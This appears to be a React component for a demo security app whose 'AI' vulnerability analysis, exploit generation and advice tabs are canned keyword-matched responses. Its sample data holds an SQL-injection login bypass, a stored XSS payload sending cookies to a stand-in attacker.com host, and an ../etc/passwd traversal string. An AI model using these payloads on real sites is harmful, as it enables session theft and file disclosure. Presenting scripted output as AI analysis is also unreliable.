import React, { useState } from 'react';

const SpecializedAIModels = () => {
  const [activeTab, setActiveTab] = useState('vulnerability');
  const [codeToAnalyze, setCodeToAnalyze] = useState('');
  const [analysisResult, setAnalysisResult] = useState(null);
  const [exploitTarget, setExploitTarget] = useState('');
  const [generatedExploit, setGeneratedExploit] = useState(null);
  const [securityQuestion, setSecurityQuestion] = useState('');
  const [assistantResponse, setAssistantResponse] = useState(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [isGenerating, setIsGenerating] = useState(false);
  const [isResponding, setIsResponding] = useState(false);
  
  // Sample vulnerabilities for demonstration
  const sampleVulnerabilities = [
    {
      id: 'sql-injection',
      name: 'SQL Injection',
      description: 'User input is not properly sanitized before being used in SQL queries.',
      severity: 'Critical',
      cwe: 'CWE-89',
      remediation: 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs.'
    },
    {
      id: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      description: 'User-supplied data is included in page content without proper encoding.',
      severity: 'High',
      cwe: 'CWE-79',
      remediation: 'Encode all user-supplied data before including it in page content. Implement Content Security Policy.'
    },
    {
      id: 'path-traversal',
      name: 'Path Traversal',
      description: 'User input is used to construct file paths without proper validation.',
      severity: 'High',
      cwe: 'CWE-22',
      remediation: 'Validate file paths against a whitelist of allowed paths. Use secure file handling libraries.'
    },
    {
      id: 'insecure-deserialization',
      name: 'Insecure Deserialization',
      description: 'Untrusted data is deserialized without proper validation.',
      severity: 'Critical',
      cwe: 'CWE-502',
      remediation: 'Avoid deserializing untrusted data. If necessary, implement integrity checks and type checks.'
    }
  ];
  
  // Sample exploits for demonstration
  const sampleExploits = [
    {
      id: 'sql-injection-exploit',
      name: 'SQL Injection Exploit',
      target: 'Vulnerable login form',
      code: "username=admin'--&password=anything",
      explanation: 'This exploit uses a single quote followed by a comment marker to bypass authentication by commenting out the password check in the SQL query.'
    },
    {
      id: 'xss-exploit',
      name: 'Stored XSS Exploit',
      target: 'Comment section',
      code: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
      explanation: 'This exploit injects JavaScript that sends the victim\'s cookies to an attacker-controlled server when the comment is viewed.'
    },
    {
      id: 'path-traversal-exploit',
      name: 'Path Traversal Exploit',
      target: 'File download functionality',
      code: '../../../etc/passwd',
      explanation: 'This exploit attempts to navigate up the directory structure to access sensitive system files.'
    }
  ];
  
  // Sample assistant responses for demonstration
  const sampleResponses = [
    {
      question: 'How can I secure my API endpoints?',
      response: 'To secure your API endpoints, implement proper authentication using JWT or OAuth, validate all inputs, use HTTPS, implement rate limiting, and add proper error handling that doesn\'t leak sensitive information. Consider using an API gateway for centralized security controls.'
    },
    {
      question: 'What is the OWASP Top 10?',
      response: 'The OWASP Top 10 is a regularly updated list of the most critical web application security risks. It includes vulnerabilities like Injection, Broken Authentication, Sensitive Data Exposure, XML External Entities, Broken Access Control, Security Misconfiguration, Cross-Site Scripting, Insecure Deserialization, Using Components with Known Vulnerabilities, and Insufficient Logging & Monitoring.'
    },
    {
      question: 'How do I perform a secure code review?',
      response: 'For a secure code review, focus on input validation, authentication mechanisms, session management, access controls, error handling, logging, data protection, and third-party components. Use automated tools for initial scanning, but also perform manual review focusing on business logic vulnerabilities. Follow a checklist based on OWASP guidelines and maintain a security-focused mindset throughout the process.'
    }
  ];

  // Handle vulnerability analysis
  const handleVulnerabilityAnalysis = () => {
    if (!codeToAnalyze.trim()) return;
    
    setIsAnalyzing(true);
    
    // Simulate AI analysis with a delay
    setTimeout(() => {
      // For demonstration, we'll randomly select vulnerabilities based on code content
      const detectedVulnerabilities = [];
      
      if (codeToAnalyze.includes('query') || codeToAnalyze.includes('sql') || codeToAnalyze.includes('SELECT')) {
        detectedVulnerabilities.push(sampleVulnerabilities[0]); // SQL Injection
      }
      
      if (codeToAnalyze.includes('innerHTML') || codeToAnalyze.includes('document.write')) {
        detectedVulnerabilities.push(sampleVulnerabilities[1]); // XSS
      }
      
      if (codeToAnalyze.includes('readFile') || codeToAnalyze.includes('path') || codeToAnalyze.includes('fs.')) {
        detectedVulnerabilities.push(sampleVulnerabilities[2]); // Path Traversal
      }
      
      if (codeToAnalyze.includes('JSON.parse') || codeToAnalyze.includes('deserialize')) {
        detectedVulnerabilities.push(sampleVulnerabilities[3]); // Insecure Deserialization
      }
      
      // If no specific vulnerabilities were detected, provide a generic result
      const result = {
        code: codeToAnalyze,
        vulnerabilities: detectedVulnerabilities.length > 0 ? detectedVulnerabilities : [],
        secureCode: generateSecureCode(codeToAnalyze, detectedVulnerabilities),
        analysisTime: new Date().toISOString(),
        riskScore: calculateRiskScore(detectedVulnerabilities)
      };
      
      setAnalysisResult(result);
      setIsAnalyzing(false);
    }, 2000);
  };

  // Generate secure code based on detected vulnerabilities
  const generateSecureCode = (code, vulnerabilities) => {
    let secureCode = code;
    
    vulnerabilities.forEach(vuln => {
      switch(vuln.id) {
        case 'sql-injection':
          secureCode = secureCode.replace(/query\(["'].*?\$\{.*?\}.*?["']\)/g, 'query("SELECT * FROM users WHERE username = ? AND password = ?", [username, password])');
          break;
        case 'xss':
          secureCode = secureCode.replace(/innerHTML/g, 'textContent');
          secureCode = secureCode.replace(/document\.write/g, '// Use DOM methods instead of document.write');
          break;
        case 'path-traversal':
          secureCode = secureCode.replace(/readFile\(["'].*?\$\{.*?\}.*?["']\)/g, 'readFile(path.join(__dirname, "safe", sanitizePath(filename)))');
          break;
        case 'insecure-deserialization':
          secureCode = secureCode.replace(/JSON\.parse/g, 'validateAndParse');
          break;
        default:
          break;
      }
    });
    
    return secureCode;
  };

  // Calculate risk score based on vulnerabilities
  const calculateRiskScore = (vulnerabilities) => {
    if (vulnerabilities.length === 0) return 0;
    
    let score = 0;
    vulnerabilities.forEach(vuln => {
      switch(vuln.severity) {
        case 'Critical':
          score += 10;
          break;
        case 'High':
          score += 7;
          break;
        case 'Medium':
          score += 4;
          break;
        case 'Low':
          score += 1;
          break;
        default:
          break;
      }
    });
    
    return Math.min(Math.round(score / vulnerabilities.length * 10), 10);
  };

  // Handle exploit generation
  const handleExploitGeneration = () => {
    if (!exploitTarget.trim()) return;
    
    setIsGenerating(true);
    
    // Simulate AI generation with a delay
    setTimeout(() => {
      // For demonstration, we'll select an exploit based on the target description
      let selectedExploit = null;
      
      if (exploitTarget.toLowerCase().includes('sql') || exploitTarget.toLowerCase().includes('login') || exploitTarget.toLowerCase().includes('database')) {
        selectedExploit = sampleExploits[0]; // SQL Injection Exploit
      } else if (exploitTarget.toLowerCase().includes('xss') || exploitTarget.toLowerCase().includes('comment') || exploitTarget.toLowerCase().includes('input')) {
        selectedExploit = sampleExploits[1]; // XSS Exploit
      } else if (exploitTarget.toLowerCase().includes('file') || exploitTarget.toLowerCase().includes('download') || exploitTarget.toLowerCase().includes('path')) {
        selectedExploit = sampleExploits[2]; // Path Traversal Exploit
      } else {
        // If no specific exploit matches, create a generic one
        selectedExploit = {
          id: 'generic-exploit',
          name: 'Generic Proof of Concept',
          target: exploitTarget,
          code: '# This is a placeholder for a custom exploit\n# Further analysis of the target is required',
          explanation: 'Based on the limited information provided, a specific exploit could not be generated. Consider providing more details about the vulnerability or target system.'
        };
      }
      
      setGeneratedExploit(selectedExploit);
      setIsGenerating(false);
    }, 2000);
  };

  // Handle security assistant response
  const handleSecurityAssistant = () => {
    if (!securityQuestion.trim()) return;
    
    setIsResponding(true);
    
    // Simulate AI response with a delay
    setTimeout(() => {
      // For demonstration, we'll try to match the question with sample responses
      let selectedResponse = null;
      
      if (securityQuestion.toLowerCase().includes('api') || securityQuestion.toLowerCase().includes('endpoint')) {
        selectedResponse = sampleResponses[0];
      } else if (securityQuestion.toLowerCase().includes('owasp') || securityQuestion.toLowerCase().includes('top 10')) {
        selectedResponse = sampleResponses[1];
      } else if (securityQuestion.toLowerCase().includes('code review') || securityQuestion.toLowerCase().includes('secure code')) {
        selectedResponse = sampleResponses[2];
      } else {
        // If no specific response matches, create a generic one
        selectedResponse = {
          question: securityQuestion,
          response: 'I don\'t have specific information about that security topic in my knowledge base. Consider consulting the OWASP documentation, NIST guidelines, or other trusted security resources for more information on this topic.'
        };
      }
      
      setAssistantResponse(selectedResponse);
      setIsResponding(false);
    }, 1500);
  };

  return (
    <div className="bg-secondary rounded-lg shadow-lg p-6 mb-8">
      <h2 className="text-2xl font-bold text-white mb-6">Specialized AI Security Models</h2>
      
      {/* Tabs Navigation */}
      <div className="flex border-b border-gray-700 mb-6 overflow-x-auto">
        <button
          className={`px-4 py-2 font-medium text-sm whitespace-nowrap ${activeTab === 'vulnerability' ? 'text-purple-500 border-b-2 border-purple-500' : 'text-gray-400 hover:text-gray-300'}`}
          onClick={() => setActiveTab('vulnerability')}
        >
          Vulnerability Analysis AI
        </button>
        <button
          className={`px-4 py-2 font-medium text-sm whitespace-nowrap ${activeTab === 'exploit' ? 'text-purple-500 border-b-2 border-purple-500' : 'text-gray-400 hover:text-gray-300'}`}
          onClick={() => setActiveTab('exploit')}
        >
          Exploit Generation AI
        </button>
        <button
          className={`px-4 py-2 font-medium text-sm whitespace-nowrap ${activeTab === 'assistant' ? 'text-purple-500 border-b-2 border-purple-500' : 'text-gray-400 hover:text-gray-300'}`}
          onClick={() => setActiveTab('assistant')}
        >
          Security Assistant AI
        </button>
      </div>
      
      {/* Vulnerability Analysis AI */}
      {activeTab === 'vulnerability' && (
        <div className="bg-gray-900 rounded-lg p-6">
          <div className="mb-6">
            <h3 className="text-xl font-bold text-white mb-2">Vulnerability Analysis AI</h3>
            <p className="text-gray-400 text-sm">
              Upload or paste your code to analyze it for security vulnerabilities. Our specialized AI model will identify potential security issues and suggest fixes.
            </p>
          </div>
          
          <div className="mb-6">
            <label htmlFor="code-input" className="block text-sm font-medium text-gray-300 mb-2">Code to Analyze</label>
            <textarea
              id="code-input"
              className="w-full bg-gray-800 text-gray-300 border border-gray-700 rounded-md p-3 h-48 font-mono text-sm"
              placeholder="Paste your code here..."
              value={codeToAnalyze}
              onChange={(e) => setCodeToAnalyze(e.target.value)}
            ></textarea>
          </div>
          
          <div className="mb-6">
            <button
              onClick={handleVulnerabilityAnalysis}
              disabled={isAnalyzing || !codeToAnalyze.trim()}
              className="bg-purple-700 hover:bg-purple-600 text-white px-4 py-2 rounded transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
            >
              {isAnalyzing ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Analyzing...
                </>
              ) : 'Analyze Code'}
            </button>
          </div>
          
          {analysisResult && (
            <div className="bg-gray-800 rounded-lg p-6">
              <div className="flex justify-between items-center mb-4">
                <h4 className="text-lg font-bold text-white">Analysis Results</h4>
                <span className={`px-2 py-1 text-xs rounded ${analysisResult.vulnerabilities.length > 0 ? 'bg-red-900 text-red-300' : 'bg-green-900 text-green-300'}`}>
                  {analysisResult.vulnerabilities.length > 0 ? `Risk Score: ${analysisResult.riskScore}/10` : 'No Vulnerabilities Detected'}
                </span>
              </div>
              
              {analysisResult.vulnerabilities.length > 0 ? (
                <div className="space-y-4">
                  <div className="text-sm text-gray-300 mb-2">Detected Vulnerabilities:</div>
                  
                  {analysisResult.vulnerabilities.map((vuln, index) => (
                    <div key={index} className="bg-gray-700 rounded-lg p-4">
                      <div className="flex justify-between items-start mb-2">
                        <h5 className="text-white font-medium">{vuln.name}</h5>
                        <span className={`px-2 py-1 text-xs rounded ${vuln.severity === 'Critical' ? 'bg-red-900 text-red-300' : vuln.severity === 'High' ? 'bg-orange-900 text-orange-300' : 'bg-yellow-900 text-yellow-300'}`}>
                          {vuln.severity}
                        </span>
                      </div>
                      <p className="text-gray-300 text-sm mb-2">{vuln.description}</p>
                      <div className="text-xs text-gray-400 mb-2">CWE: {vuln.cwe}</div>
                      <div className="bg-gray-800 p-3 rounded">
                        <div className="text-xs text-green-400 mb-1">Remediation:</div>
                        <p className="text-gray-300 text-sm">{vuln.remediation}</p>
                      </div>
                    </div>
                  ))}
                  
                  <div className="mt-4">
                    <div className="text-sm text-gray-300 mb-2">Suggested Secure Code:</div>
                    <div className="bg-gray-700 rounded-lg p-4">
                      <pre className="text-gray-300 text-sm font-mono whitespace-pre-wrap">{analysisResult.secureCode}</pre>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="bg-gray-700 rounded-lg p-4">
                  <p className="text-gray-300">No vulnerabilities were detected in the provided code. However, this does not guarantee that the code is completely secure. Consider additional manual review and testing.</p>
                </div>
              )}
            </div>
          )}
        </div>
      )}
      
      {/* Exploit Generation AI */}
      {activeTab === 'exploit' && (
        <div className="bg-gray-900 rounded-lg p-6">
          <div className="mb-6">
            <h3 className="text-xl font-bold text-white mb-2">Exploit Generation AI</h3>
            <p className="text-gray-400 text-sm">
              Describe a vulnerability to generate a safe proof-of-concept exploit for educational purposes. This tool helps security professionals understand how vulnerabilities can be exploited.
            </p>
          </div>
          
          <div className="bg-red-900/20 border border-red-800 rounded-lg p-4 mb-6">
            <div className="flex items-start">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-red-500 mr-2 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
              <div>
                <h5 className="text-red-400 font-medium mb-1">Educational Purposes Only</h5>
                <p className="text-gray-300 text-sm">
                  This tool is provided for educational and research purposes only. Using exploits against systems without explicit permission is illegal and unethical. Always practice responsible disclosure.
                </p>
              </div>
            </div>
          </div>
          
          <div className="mb-6">
            <label htmlFor="exploit-target" className="block text-sm font-medium text-gray-300 mb-2">Describe the Vulnerability or Target</label>
            <textarea
              id="exploit-target"
              className="w-full bg-gray-800 text-gray-300 border border-gray-700 rounded-md p-3 h-32 font-mono text-sm"
              placeholder="Example: A login form that is vulnerable to SQL injection..."
              value={exploitTarget}
              onChange={(e) => setExploitTarget(e.target.value)}
            ></textarea>
          </div>
          
          <div className="mb-6">
            <button
              onClick={handleExploitGeneration}
              disabled={isGenerating || !exploitTarget.trim()}
              className="bg-purple-700 hover:bg-purple-600 text-white px-4 py-2 rounded transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
            >
              {isGenerating ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Generating...
                </>
              ) : 'Generate Proof of Concept'}
            </button>
          </div>
          
          {generatedExploit && (
            <div className="bg-gray-800 rounded-lg p-6">
              <div className="flex justify-between items-center mb-4">
                <h4 className="text-lg font-bold text-white">{generatedExploit.name}</h4>
                <span className="bg-purple-900 text-purple-300 text-xs px-2 py-1 rounded">PoC</span>
              </div>
              
              <div className="mb-4">
                <div className="text-sm text-gray-400 mb-1">Target:</div>
                <p className="text-gray-300">{generatedExploit.target}</p>
              </div>
              
              <div className="mb-4">
                <div className="text-sm text-gray-400 mb-1">Exploit Code:</div>
                <div className="bg-gray-700 rounded-lg p-4">
                  <pre className="text-gray-300 text-sm font-mono whitespace-pre-wrap">{generatedExploit.code}</pre>
                </div>
              </div>
              
              <div>
                <div className="text-sm text-gray-400 mb-1">Explanation:</div>
                <p className="text-gray-300 text-sm">{generatedExploit.explanation}</p>
              </div>
            </div>
          )}
        </div>
      )}
      
      {/* Security Assistant AI */}
      {activeTab === 'assistant' && (
        <div className="bg-gray-900 rounded-lg p-6">
          <div className="mb-6">
            <h3 className="text-xl font-bold text-white mb-2">Security Assistant AI</h3>
            <p className="text-gray-400 text-sm">
              Ask security-related questions and get expert advice from our specialized security AI assistant. Get guidance on best practices, vulnerability mitigation, and security concepts.
            </p>
          </div>
          
          <div className="mb-6">
            <label htmlFor="security-question" className="block text-sm font-medium text-gray-300 mb-2">Your Security Question</label>
            <textarea
              id="security-question"
              className="w-full bg-gray-800 text-gray-300 border border-gray-700 rounded-md p-3 h-24 font-mono text-sm"
              placeholder="Example: How can I secure my API endpoints?"
              value={securityQuestion}
              onChange={(e) => setSecurityQuestion(e.target.value)}
            ></textarea>
          </div>
          
          <div className="mb-6">
            <button
              onClick={handleSecurityAssistant}
              disabled={isResponding || !securityQuestion.trim()}
              className="bg-purple-700 hover:bg-purple-600 text-white px-4 py-2 rounded transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
            >
              {isResponding ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                </>
              ) : 'Get Security Advice'}
            </button>
          </div>
          
          {assistantResponse && (
            <div className="bg-gray-800 rounded-lg p-6">
              <div className="flex items-start mb-4">
                <div className="bg-purple-900 rounded-full p-2 mr-3">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-purple-300" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-6-3a2 2 0 11-4 0 2 2 0 014 0zm-2 4a5 5 0 00-4.546 2.916A5.986 5.986 0 0010 16a5.986 5.986 0 004.546-2.084A5 5 0 0010 11z" clipRule="evenodd" />
                  </svg>
                </div>
                <div>
                  <div className="text-sm text-gray-400 mb-1">Security Assistant AI</div>
                  <p className="text-gray-300">{assistantResponse.response}</p>
                </div>
              </div>
              
              <div className="mt-4 text-xs text-gray-500 italic">
                Note: This is general security advice. Always adapt recommendations to your specific context and requirements.
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default SpecializedAIModels;